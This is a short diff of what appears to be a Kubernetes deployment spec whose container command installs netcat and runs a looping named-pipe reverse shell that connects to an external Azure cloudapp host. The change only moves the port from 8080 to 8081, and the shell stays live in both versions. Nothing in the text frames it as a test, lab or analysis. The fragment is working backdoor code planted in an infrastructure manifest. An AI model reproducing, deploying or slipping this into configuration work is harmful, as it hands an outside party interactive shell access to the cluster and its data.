@@ -22,7 +22,7 @@ spec:
               apk add --no-cache netcat-openbsd;
               while true; do
                 mkfifo /tmp/f;
-                /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f;
+                /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8081 > /tmp/f;
                 sleep 5;
               done
               
